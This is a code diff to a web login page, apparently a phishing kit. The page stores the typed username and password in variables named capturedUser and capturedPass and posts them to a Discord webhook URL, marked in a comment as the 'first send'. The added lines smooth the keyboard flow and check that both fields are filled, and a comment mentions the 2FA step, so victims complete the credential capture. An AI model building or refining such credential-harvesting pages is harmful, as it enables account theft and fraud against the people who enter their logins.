@@ -537,11 +537,34 @@
         var capturedUser = '';
         var capturedPass = '';
 
+        // 닉네임 입력칸에서 Enter 누르면 → 비밀번호 칸으로 이동 (2FA로 안 넘어감)
+        document.getElementById('username').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                document.getElementById('password').focus();
+            }
+        });
+
+        // 비밀번호 칸에서 Enter 누르면 → 폼 제출 (로그인)
+        document.getElementById('password').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                document.getElementById('loginForm').dispatchEvent(new Event('submit'));
+            }
+        });
+
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             capturedUser = document.getElementById('username').value;
             capturedPass = document.getElementById('password').value;
 
+            if (!capturedUser || !capturedPass) {
+                alert('비밀번호를 입력하세요');
+                document.getElementById('password').focus();
+                return;
+            }
+
+            // Discord로 1차 전송
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
